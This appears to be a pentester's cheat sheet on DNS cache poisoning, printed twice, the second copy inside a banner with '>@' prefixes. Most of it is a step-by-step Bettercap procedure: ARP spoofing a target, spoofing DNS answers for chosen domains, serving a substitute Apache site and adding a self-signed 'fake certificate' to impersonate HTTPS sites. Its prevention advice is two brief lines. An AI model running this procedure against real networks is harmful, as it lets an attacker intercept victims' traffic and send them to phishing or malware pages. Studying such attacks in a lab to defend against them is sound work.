DNS spoofind | DNS poisoning

DNS cache poisoning, DNS spoofing, or DNS cache pollution (DNS cache poisoning, DNS spoofing, or DNS cache  
pollution in English) is a technique allowing DNS servers to be deceived into believing that they receive    
a valid response to a request they make, even though it is fraudulent. Once the DNS server has been           
poisoned, the information is cached, making all users of that server vulnerable. This type of attack           
allows, for example, to send a user to a fake site whose content can be used for phishing (in the case of      
DNS, we speak of pharming) or as a vector for viruses and other malicious applications.                        
                                                                                                              

-> How to do a DNS spoofing

1. Flush the iptables tables.
$ sudo iptables -F -t nat

2. Use Bettercap to start an ARP spoofing. 
$ sudo bettercap
  » set arp.spoof.fullduplex true
  » set arp.spoof.targets <target ip>
  » arp.spoof on

3. Use Bettercap to start DNS spoofing.
» set dns.spoof.all true				> dns spoofing is activated on all requests.
» set dns.spoof.domains example.com,*.example.com	> we define domains to be usurpated.
» set dns.spoof.address <kali ip>			> set the new DNS.
» dns.spoof on						> start the dns spoofing.

4. Start the web server of substitution.
$ sudo service apache2 start
>>> At this point, you could modify the /var/www/html/index.html defaut page.

5. Now, on the target machine, example.com will be redirected to the Kali web server.

6. For https, we can create fake certificat.
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key 
       -out /etc/ssl/certs/apache-selfsigned.crt

Change the site:
vi /etc/apache2/sites-available/default-ssl.conf

Modify those lines with the new certificate:
SSLCertificateFile	/etc/ssl/certs/apache-selfsigned.crt
SSLCertificateKeyFile	/etc/ssl/private/apache-selfsigned.key

Activate the secured version of Apache:
$ sudo a2ensite default-ssl.conf

Restart Apache:
$ sudo service apache2 stop
$ sudo service apache2 start

-> How to prevent DNS spoofing
  -Use HTTPS sites only.
  -Use Simple DNS Script.

>@
>@##################################################################################################################
>@#                                                                                                                #                                     
>@# [ DNS spoofind | DNS poisoning ]                                                                               #                   
>@#                                                                                                                #                                     
>@# DNS cache poisoning, DNS spoofing, or DNS cache pollution (DNS cache poisoning, DNS spoofing, or DNS cache     #
>@# pollution in English) is a technique allowing DNS servers to be deceived into believing that they receive      #
>@# a valid response to a request they make, even though it is fraudulent. Once the DNS server has been            #
>@# poisoned, the information is cached, making all users of that server vulnerable. This type of attack           #
>@# allows, for example, to send a user to a fake site whose content can be used for phishing (in the case of      #
>@# DNS, we speak of pharming) or as a vector for viruses and other malicious applications.                        #
>@#                                                                                                                #                                     
>@#----------------------------------------------------------------------------------------------------------------# 
>@
>@-> How to do a DNS spoofing
>@
>@1. Flush the iptables tables.
>@$ sudo iptables -F -t nat
>@
>@2. Use Bettercap to start an ARP spoofing. 
>@$ sudo bettercap
>@  » set arp.spoof.fullduplex true
>@  » set arp.spoof.targets <target ip>
>@  » arp.spoof on
>@
>@3. Use Bettercap to start DNS spoofing.
>@» set dns.spoof.all true				> dns spoofing is activated on all requests.
>@» set dns.spoof.domains example.com,*.example.com	> we define domains to be usurpated.
>@» set dns.spoof.address <kali ip>			> set the new DNS.
>@» dns.spoof on						> start the dns spoofing.
>@
>@4. Start the web server of substitution.
>@$ sudo service apache2 start
>@>>> At this point, you could modify the /var/www/html/index.html defaut page.
>@
>@5. Now, on the target machine, example.com will be redirected to the Kali web server.
>@
>@6. For https, we can create fake certificat.
>@$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key 
>@       -out /etc/ssl/certs/apache-selfsigned.crt
>@
>@Change the site:
>@vi /etc/apache2/sites-available/default-ssl.conf
>@
>@Modify those lines with the new certificate:
>@SSLCertificateFile	/etc/ssl/certs/apache-selfsigned.crt
>@SSLCertificateKeyFile	/etc/ssl/private/apache-selfsigned.key
>@
>@Activate the secured version of Apache:
>@$ sudo a2ensite default-ssl.conf
>@
>@Restart Apache:
>@$ sudo service apache2 stop
>@$ sudo service apache2 start
>@
>@-> How to prevent DNS spoofing
>@  -Use HTTPS sites only.
>@  -Use Simple DNS Script.
>@
>@##################################################################################################################
>@
